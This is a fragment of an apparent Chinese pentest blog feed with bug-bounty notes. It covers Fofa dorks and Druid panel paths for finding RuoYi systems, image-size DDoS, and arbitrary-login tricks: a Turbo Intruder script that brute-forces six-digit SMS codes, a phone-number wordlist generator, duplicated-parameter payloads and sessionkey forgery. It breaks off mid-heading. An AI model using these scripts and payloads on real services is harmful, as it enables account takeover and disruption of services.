        <content type="html"><![CDATA[<h1 id="RuoYi系统"><a href="#RuoYi系统" class="headerlink" title="RuoYi系统"></a>RuoYi系统</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>先简单介绍一下RuoYi系统和Druid数据库，如下：</p><p><img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231129234836963.png" alt="image-20231129234836963"></p><p>RuoYi是一个基于Java技术开发的后台管理系统，目前官方同步在维护的有3个版本：</p><ul><li>若依不分离版本：&#x3D;&#x3D;RuoYi&#x3D;&#x3D;是基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf）主要目的让开发者注重专注业务，降低技术难度，从而节省人力成本，缩短项目周期，提高软件安全质量【<a href="https://gitee.com/y_project/RuoYi%E3%80%91">https://gitee.com/y_project/RuoYi】</a></li><li>若依前后端分离版本：&#x3D;&#x3D;RuoYi-Vue&#x3D;&#x3D;是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Spring Security、MyBatis、Jwt、Vue），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、代码生成等。在线定时任务配置；支持集群，支持多数据源，支持分布式事务【<a href="https://gitee.com/y_project/RuoYi-Vue%E3%80%91">https://gitee.com/y_project/RuoYi-Vue】</a></li><li>若依微服务版本：&#x3D;&#x3D;RuoYi-Cloud&#x3D;&#x3D; 是一个 Java EE 分布式微服务架构平台，基于经典技术组合（Spring Boot、Spring Cloud &amp; Alibaba、Vue、Element），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、代码生成等。在线定时任务配置；支持集群，支持多数据源【<a href="https://gitee.com/y_project/RuoYi-Cloud%E3%80%91">https://gitee.com/y_project/RuoYi-Cloud】</a></li></ul><h2 id="针对RuoYi系统的信息收集手法"><a href="#针对RuoYi系统的信息收集手法" class="headerlink" title="针对RuoYi系统的信息收集手法"></a>针对RuoYi系统的信息收集手法</h2><h3 id="图标收集法"><a href="#图标收集法" class="headerlink" title="图标收集法"></a>图标收集法</h3><pre class="line-numbers language-none"><code class="language-none">#使用Fofa搜索(icon_hash&#x3D;&quot;-1231872293&quot; || icon_hash&#x3D;&quot;706913071&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="关键词收集法"><a href="#关键词收集法" class="headerlink" title="关键词收集法"></a>关键词收集法</h3><p>网页中&#x2F;网页标题的关键字<code>若依管理系统</code>或者<code>RuoYi</code>，不过注意这些关键词是RuoYi默认页面的，实际开发过程中大部分存在二改的情况</p><pre class="line-numbers language-none"><code class="language-none">#使用Fofa搜索title&#x3D;&quot;登录若依系统&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="若依前后端分离版本中的后端收集"><a href="#若依前后端分离版本中的后端收集" class="headerlink" title="若依前后端分离版本中的后端收集"></a>若依前后端分离版本中的后端收集</h3><ul><li><p>主要依据一些RuoYi后端常用的欢迎语：<img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130105515795.png" alt="image-20231130105515795">实际开发中存在很多二改版本，大概会修改“RuoYi后台管理框架”这段文字，如下<img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130105632621.png" alt="image-20231130105632621"></p><pre class="line-numbers language-none"><code class="language-none">#通过使用Fofa进行内容匹配搜索body&#x3D;&quot;请通过前端地址访问&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>除了存在后台欢迎语的情况，也可能做了弱权限校验，会出现以下提示语<img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130105951096.png" alt="image-20231130105951096"></p><pre class="line-numbers language-none"><code class="language-none">#通过使用Fofa进行内容匹配搜索body&#x3D;&#39;认证失败，无法访问系统资源&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>如果针对的是挖教育src的漏洞，可以组合下面这条语句筛选教育网段的站点</p><pre class="line-numbers language-none"><code class="language-none">org&#x3D;&quot;China Education and Research Network Center&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130113157303.png" alt="image-20231130113157303"></p></li></ul></li></ul><h3 id="druid目录探测"><a href="#druid目录探测" class="headerlink" title="druid目录探测"></a>druid目录探测</h3><p>如果配置不当可能不需要druid密码，访问以下路径，即可直接访问druid</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;druid&#x2F;index.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若依默认的druid后台路径如下</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;druid&#x2F;login.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130113347437.png" alt="image-20231130113347437"></p><p>若依存在默认的api，druid的后台路径也可能在api下</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;prod-api&#x2F;druid&#x2F;login.html&#x2F;dev-api&#x2F;druid&#x2F;login.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130122223016.png" alt="image-20231130122223016"></p><p>如果开发者在开发过程中使用了自定义的路径，可以先在主系统登录错误一次，查看返回数据包中有没有暴露目录，或者对api进行逐级爬取和访问，找到可疑api后进行拼接访问</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#123;发现的api&#125;&#x2F;druid&#x2F;login.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130122742040.png" alt="image-20231130122742040"></p><p><img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130122825611.png" alt="image-20231130122825611"></p><p>这里再给出druid常见的后台路径地址：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;druid&#x2F;index.html&#x2F;druid&#x2F;login.html&#x2F;system&#x2F;druid&#x2F;login.html&#x2F;webpage&#x2F;system&#x2F;druid&#x2F;login.html&#x2F;prod-api&#x2F;druid&#x2F;login.html&#x2F;prod-api&#x2F;druid&#x2F;index.html&#x2F;dev-api&#x2F;druid&#x2F;login.html&#x2F;dev-api&#x2F;druid&#x2F;index.html&#x2F;api&#x2F;druid&#x2F;login.html&#x2F;api&#x2F;druid&#x2F;index.html&#x2F;admin&#x2F;druid&#x2F;login.html&#x2F;admin-api&#x2F;druid&#x2F;login.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常见druid未授权访问路径：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;druid&#x2F;websession.html#用于监控和管理Web会话Session，保存着大量会话Session&#x2F;system&#x2F;druid&#x2F;websession.html&#x2F;webpage&#x2F;system&#x2F;druid&#x2F;websession.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="druid爆破"><a href="#druid爆破" class="headerlink" title="druid爆破"></a>druid爆破</h3><p>druid爆破主要分为：</p><ul><li><p>后台弱口令爆破</p></li><li><p>通过泄露的Session爆破，实现未授权访问</p><p>比如在&#x2F;druid&#x2F;websession.html页面获取到了大量Session，就可以收集这些Session进行爆破，如下<img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130134748196.png" alt="image-20231130134748196"><img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130133838546.png" alt="image-20231130133838546"></p><p>收集这些Session，再找一条看起来像登录后台才能访问的路径(可以使用目录爆破、逐级爬取访问得到，一般是带home关键词的路径)，在BurpSuite中进行爆破<img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130134411183.png" alt="image-20231130134411183"><img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130134457117.png" alt="image-20231130134457117"><img src="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/image-20231130134530807.png" alt="image-20231130134530807"></p></li></ul><h1 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h1><ul><li><a href="https://blog.csdn.net/weixin_45433031/article/details/122971685">https://blog.csdn.net/weixin_45433031/article/details/122971685</a></li><li><a href="https://www.cnblogs.com/cwkiller/p/12483223.html">https://www.cnblogs.com/cwkiller/p/12483223.html</a></li><li><a href="https://bbs.huaweicloud.com/blogs/403464">Druid未授权访问 漏洞复现-云社区-华为云 (huaweicloud.com)</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDoS漏洞挖掘</title>
      <link href="/2023/11/29/DDoS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
      <url>/2023/11/29/DDoS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<p>这里先简单介绍一下DDoS</p><p><img src="/2023/11/29/DDoS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20231129204650908.png" alt="image-20231129204650908"></p><p><img src="/2023/11/29/DDoS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20231129204700389.png" alt="image-20231129204700389"></p><p>在漏洞挖掘的时候还会碰到其他造成DDoS的漏洞，&#x3D;&#x3D;这里注意一点，DDoS不一定要通过不断发包导致&#x3D;&#x3D;</p><h1 id="图像大小与请求参数可修改"><a href="#图像大小与请求参数可修改" class="headerlink" title="图像大小与请求参数可修改"></a>图像大小与请求参数可修改</h1><p>图片大小相关参数可控导致DDoS &gt; 影响服务端对图片处理的参数可控，进而可通过修改参数导致服务端分配大量资源处理图片，造成DDoS效果。攻击者不需要在此类攻击中投入资源，但服务器可能会分配所需的像素缓冲区（导致内存不足）或者执行随图像大小变化的计算（导致占用服务器CPU）。通过这种能一次请求大型资源的漏洞，也会造成DDos。</p><p>这一类的漏洞挖掘，可以使用BurpSuite的Image Size Issues插件</p><p>下载地址：<a href="https://github.com/portswigger/image-size-issues">https://github.com/portswigger/image-size-issues</a>  </p><p>也可以在BurpSuite的插件商城中直接搜索安装</p><p><img src="/2023/11/29/DDoS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20231129210214416.png" alt="image-20231129210214416"></p><p>安装并启用后，在挂着Burp代理浏览网页时，若存在此漏洞，Burp在Target中显示 Image size matches request parameters，如下</p><p><img src="/2023/11/29/DDoS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20231129210532413.png" alt="image-20231129210532413"></p><h1 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h1><ul><li><a href="https://mp.weixin.qq.com/s/RG6J2OIvvrU6wLXZ5s1QBw">https://mp.weixin.qq.com/s/RG6J2OIvvrU6wLXZ5s1QBw</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>斜体粗体测试</title>
      <link href="/2023/11/29/%E6%96%9C%E4%BD%93%E7%B2%97%E4%BD%93%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/11/29/%E6%96%9C%E4%BD%93%E7%B2%97%E4%BD%93%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>正常：Hello 你好</p><p>双星号粗体：<strong>Hello 你好</strong> </p><p>双下划线粗体：<strong>Hello 你好</strong></p><p>斜体：<em>Hello</em> 你好</p><p><del>删除文本</del></p><blockquote><p>一层引用</p><blockquote><p>二层引用</p></blockquote></blockquote><p>加粗并斜体1：<em><strong>Hello 你好</strong></em><br>加粗并斜体2：<em><strong>Hello 你好</strong></em><br>加粗并斜体3：*<strong>Hello 你好</strong>*</p>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    
    
    <entry>
      <title>任意用户登录漏洞挖掘思路</title>
      <link href="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/"/>
      <url>/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="手机验证码问题导致的任意用户登录"><a href="#手机验证码问题导致的任意用户登录" class="headerlink" title="手机验证码问题导致的任意用户登录"></a>手机验证码问题导致的任意用户登录</h1><p>手机验证码导致的任意用户登录主要包括：验证码爆破、验证码明文返回、存在万能验证码、验证码未绑定用户、获取验证码的手机号字段可双写、验证码为空&#x2F;任意验证码可成功验证等。下面展开来讲。</p><h2 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h2><p>当登录流程使用手机验证码登录，没有图片验证码&#x2F;图片验证码可重用&#x2F;图片验证码简单可识别且后端没有限制手机验证码验证错误次数时，可以尝试爆破手机验证码登录其他用户。</p><p>数字验证码的爆破可以是用burpsuite的Turbo Intruder插件编写脚本实现：</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128150318796.png" alt="image-20231128150318796"></p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128150416616.png" alt="image-20231128150416616"></p><p>修改代码为下面的代码：</p><pre class="line-numbers language-none"><code class="language-none">import redef queueRequests(target, wordlists):    engine &#x3D; RequestEngine(endpoint&#x3D;target.endpoint,                           concurrentConnections&#x3D;30,                           requestsPerConnection&#x3D;30,                           pipeline&#x3D;True                           )    #生成六位验证码字典    for i in range(1000000):        number &#x3D; &quot;&#123;:06d&#125;&quot;.format(i)        engine.queue(target.req, number.rstrip())def handleResponse(req, interesting):    # currently available attributes are req.status, req.wordcount, req.length and req.response    if req.status &lt; 404:        #六位数的验证码爆破结果展示列太多，可根据实际情况自行筛选展示        # res &#x3D; re.findall(&#39;Msg&quot;:&quot;(.*?)&quot;&#39;,req.response)[0]        # if len(res)&gt;18:        table.add(req)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单图像验证码爆破可以使用：</p><ul><li>burpsuite中的captcha-killer-modified插件，下载地址如下<ul><li><a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a></li><li><a href="https://github.com/f0ng/captcha-killer-modified.git">https://github.com/f0ng/captcha-killer-modified.git</a></li></ul></li></ul><p>&#x3D;&#x3D;目前常用的4~6位数验证码，如果不加其他限制(如访问次数)的情况下，均可以爆破&#x3D;&#x3D;</p><h2 id="验证码明文返回"><a href="#验证码明文返回" class="headerlink" title="验证码明文返回"></a>验证码明文返回</h2><p>获取手机验证码时，验证码直接在返回包里</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128152103594.png" alt="image-20231128152103594"></p><h2 id="存在万能验证码"><a href="#存在万能验证码" class="headerlink" title="存在万能验证码"></a>存在万能验证码</h2><p>一般是测试为了功能测试方便，设置了诸如000000，123456之类的万能验证码，项目上线时忘记下掉，导致任意用户登录。同样的，手机号码同样可能存在万能手机号，如13888888888等，这里提供一个脚本可以生成以138、192等常规开头的手机号码：</p><pre class="line-numbers language-none"><code class="language-none"># 特殊手机号生成import itertoolsa &#x3D; [&#39;11111111&#39;, &#39;00000000&#39;,&#39;22222222&#39;,&#39;33333333&#39;,&#39;44444444&#39;,&#39;55555555&#39;,&#39;66666666&#39;,&#39;77777777&#39;,&#39;88888888&#39;,&#39;99999999&#39;,&#39;12345678&#39;]b &#x3D; [&#39;0000&#39;,&#39;1111&#39;,&#39;2222&#39;,&#39;3333&#39;,&#39;4444&#39;,&#39;5555&#39;,&#39;6666&#39;,&#39;7777&#39;,&#39;8888&#39;,&#39;9999&#39;]c &#x3D; [&#39;0000&#39;,&#39;1111&#39;,&#39;2222&#39;,&#39;3333&#39;,&#39;4444&#39;,&#39;5555&#39;,&#39;6666&#39;,&#39;7777&#39;,&#39;8888&#39;,&#39;9999&#39;]d1 &#x3D; [&#39;134&#39;,&#39;135&#39;,&#39;136&#39;,&#39;137&#39;,&#39;138&#39;,&#39;139&#39;,&#39;147&#39;,&#39;150&#39;,&#39;151&#39;,&#39;152&#39;,&#39;157&#39;,&#39;158&#39;,&#39;159&#39;,&#39;178&#39;,&#39;182&#39;,&#39;183&#39;,&#39;184&#39;,&#39;187&#39;,&#39;188&#39;]d2 &#x3D; [&#39;130&#39;,&#39;131&#39;,&#39;132&#39;,&#39;145&#39;,&#39;155&#39;,&#39;156&#39;,&#39;185&#39;,&#39;186&#39;,&#39;176&#39;,&#39;175&#39;]d3 &#x3D; [&#39;133&#39;,&#39;149&#39;,&#39;153&#39;,&#39;180&#39;,&#39;181&#39;,&#39;189&#39;,&#39;177&#39;,&#39;192&#39;,&#39;197&#39;]phone &#x3D; []for i, n in itertools.product(d1, a):    _ &#x3D; f&#39;&#123;i&#125;&#123;n&#125;&#39;    phone.append(_)for i, n in itertools.product(d2, a):    _ &#x3D; f&#39;&#123;i&#125;&#123;n&#125;&#39;for i, n in itertools.product(d3, a):    _ &#x3D; f&#39;&#123;i&#125;&#123;n&#125;&#39; for i, n, m in itertools.product(d1, b, c):    _ &#x3D; f&#39;&#123;i&#125;&#123;n&#125;&#123;m&#125;&#39;    phone.append(_)for i in d2:    for n in b:        for m in c:            _ &#x3D; f&#39;&#123;i&#125;&#123;n&#125;&#123;m&#125;&#39;            phone.append(_)for i in d3:    for n in b:        for m in c:            _ &#x3D; f&#39;&#123;i&#125;&#123;n&#125;&#123;m&#125;&#39;            phone.append(_)with open(&#39;phone.txt&#39;,&#39;a&#39;) as f:    for i in phone:        f.write(str(i) + &#39;\n&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="验证码未绑定用户"><a href="#验证码未绑定用户" class="headerlink" title="验证码未绑定用户"></a>验证码未绑定用户</h2><p>一般有以下两种情况：</p><ul><li><p>后端仅验证了验证码是否正确，没有验证验证码与获取手机号的对应关系，导致可以先输入自己的手机号A获取验证码，再输入他人手机号B获取验证码后，填写自己手机号A接收到的验证码，达到登录手机号B的目的</p></li><li><p>后端仅验证了手机号与验证码是否正确，并未校验手机号是否为号主本人的，导致可以使用自己的手机号+验证码绕过。常见于用户绑定的功能处，如下例子：<img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128154250715.png" alt="image-20231128154250715"><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128154301804.png" alt="image-20231128154301804"><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128154317245.png" alt="image-20231128154317245"><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128154328912.png" alt="image-20231128154328912"></p></li></ul><h2 id="获取验证码的手机号字段可双写"><a href="#获取验证码的手机号字段可双写" class="headerlink" title="获取验证码的手机号字段可双写"></a>获取验证码的手机号字段可双写</h2><p>输入手机号获取验证码时抓包，双写手机号字段，使得两个手机号获取到同一个验证码，便可以登录其他用户</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128155132283.png" alt="image-20231128155132283"></p><p>输入自己的手机号抓包，将手机字段后面加一个逗号,或者分号;后再加一个手机号，或者双写手机号字段phone&#x3D;13333333333&amp;phone&#x3D;18888888888，具体可以展开想象力，下面举个例子：</p><p>原字段：phone&#x3D;13333333333</p><p>修改后字段：</p><ul><li>phone&#x3D;13333333333;18888888888</li><li>phone&#x3D;13333333333,18888888888</li><li>phone&#x3D;13333333333&amp;phone&#x3D;18888888888</li></ul><p>&#x3D;&#x3D;当两个手机号均收到一个验证码时大概率漏洞存在&#x3D;&#x3D;。使用自己的手机号便可以任意登录其他手机号。</p><h2 id="验证码为空-任意验证码可成功验证"><a href="#验证码为空-任意验证码可成功验证" class="headerlink" title="验证码为空&#x2F;任意验证码可成功验证"></a>验证码为空&#x2F;任意验证码可成功验证</h2><p>比较奇葩的例子，验证码为空时，手机号正确则成功登录（账号密码登录体系也发现过这种情况，空密码的情况下账号存在即登录）</p><h2 id="补充-由于验证码导致的短信轰炸"><a href="#补充-由于验证码导致的短信轰炸" class="headerlink" title="(补充)由于验证码导致的短信轰炸"></a>(补充)由于验证码导致的短信轰炸</h2><p>说到验证码，这里可以再提一下由于验证码导致的短信轰炸。有以下测试思路：</p><ul><li>&#x3D;&#x3D;在一些能接受验证码的地方，有一些参数是判定验证码是否获取成功、获取已发送短信的次数。我们测试短信轰炸漏洞的时候可以尝试删除一些参数然后观察响应结果&#x3D;&#x3D;</li><li>&#x3D;&#x3D;在手机号&#x2F;邮箱的传参处输入一些特殊符号进行绕过短信限制(如逗号,)&#x3D;&#x3D;，有些发送手机号的接口或者邮箱接口当发送时抓包，如果在接受手机参数处没有过滤好一些特殊符号，会导致短信轰炸<img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231130141131827.png" alt="image-20231130141131827"></li></ul><h1 id="凭证安全问题导致的任意用户登录"><a href="#凭证安全问题导致的任意用户登录" class="headerlink" title="凭证安全问题导致的任意用户登录"></a>凭证安全问题导致的任意用户登录</h1><h2 id="凭证泄露"><a href="#凭证泄露" class="headerlink" title="凭证泄露"></a>凭证泄露</h2><h3 id="页面缓存被搜索引擎抓取"><a href="#页面缓存被搜索引擎抓取" class="headerlink" title="页面缓存被搜索引擎抓取"></a>页面缓存被搜索引擎抓取</h3><p>&#x3D;&#x3D;页面缓存被搜索引擎抓取&#x3D;&#x3D;，搜索引擎直接搜索该域名或者搭配搜索引擎的其他语法。如果发现&#x3D;&#x3D;有登录后的页面被抓取&#x3D;&#x3D;，可以尝试直接访问登录目标账户。谷歌搜索语法：</p><ul><li>site:example.com.cn</li></ul><h3 id="httptrace-druid等组件中的凭证泄露"><a href="#httptrace-druid等组件中的凭证泄露" class="headerlink" title="httptrace&#x2F;druid等组件中的凭证泄露"></a>httptrace&#x2F;druid等组件中的凭证泄露</h3><p>这里先介绍一下httptrace spring和druid</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128161741551.png" alt="image-20231128161741551"></p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128161704911.png" alt="image-20231128161704911"></p><h4 id="httptrace-spring"><a href="#httptrace-spring" class="headerlink" title="httptrace spring"></a>httptrace spring</h4><p>spring的httptrace端点往往会记录用户的会话信息，若发现spring未授权访问且存在类似端点可以访问的话，可尝试获取用户凭证进行登录</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128162126651.png" alt="image-20231128162126651"></p><h4 id="durid"><a href="#durid" class="headerlink" title="durid"></a>durid</h4><p>druid的session监控发现有效的会话信息时，可以通过此登录任意用户</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128162143975.png" alt="image-20231128162143975"></p><p>&#x3D;&#x3D;httptrace&#x2F;druid的等组件的凭据泄露，主要是泄露了会话密钥(即session_key、session_token这些)&#x3D;&#x3D;，下面再举一个微信小程序官方的sessionkey泄露</p><h4 id="微信小程序官方sessionkey泄露"><a href="#微信小程序官方sessionkey泄露" class="headerlink" title="微信小程序官方sessionkey泄露"></a>微信小程序官方sessionkey泄露</h4><p>微信小程序官方提供了一套微信快捷登录的登录逻辑：用户授权手机号快捷登录时，会将本地的手机号使用sessionkey和iv进行aes加密，后端解密后返回该手机号的登录凭证。当sessionkey发生泄露时，攻击者便可以伪造手机号登录任意手机号</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128162835641.png" alt="image-20231128162835641"></p><p>修改任意手机号，利用sessionkey和iv重新加密数据</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128162922040.png" alt="image-20231128162922040"></p><p>成功登录他人账号</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128163020899.png" alt="image-20231128163020899"></p><h4 id="其他接口中的信息泄露"><a href="#其他接口中的信息泄露" class="headerlink" title="其他接口中的信息泄露"></a>其他接口中的信息泄露</h4><p>这个一般发现于js或者api-docs中的某些特殊接口，例如getToken之类的，有没有取决于开发有没有开发类似的功能接口</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128163705003.png" alt="image-20231128163705003"></p><h2 id="凭证伪造"><a href="#凭证伪造" class="headerlink" title="凭证伪造"></a>凭证伪造</h2><h3 id="jwt未校验参数-使用弱密钥"><a href="#jwt未校验参数-使用弱密钥" class="headerlink" 